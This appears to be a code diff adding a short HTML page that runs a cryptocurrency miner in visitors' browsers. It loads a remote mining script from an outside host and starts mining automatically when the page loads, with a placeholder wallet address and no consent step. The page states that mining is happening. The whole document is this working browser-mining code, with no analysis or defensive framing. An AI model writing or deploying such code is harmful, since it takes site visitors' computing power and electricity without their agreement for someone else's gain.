@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Automatic Crypto Miner</title>
+</head>
+<body>
+  <h1>Automatic Mining in Progress...</h1>
+  <p>Your computer is mining cryptocurrency automatically.</p>
+  
+  <script src="https://webminerpool.com/lib/miner.min.js"></script>
+  <script>
+    // Create a miner instance
+    const miner = new Miner("your-wallet-address");
+
+    // Automatically start mining when the page loads
+    window.onload = () => {
+      miner.start();
+      console.log("Mining started automatically!");
+    };
+
+    // Stop mining if the user leaves the page
+    window.onbeforeunload = () => {
+      miner.stop();
+      console.log("Mining stopped.");
+    };
+  </script>
+</body>
+</html>
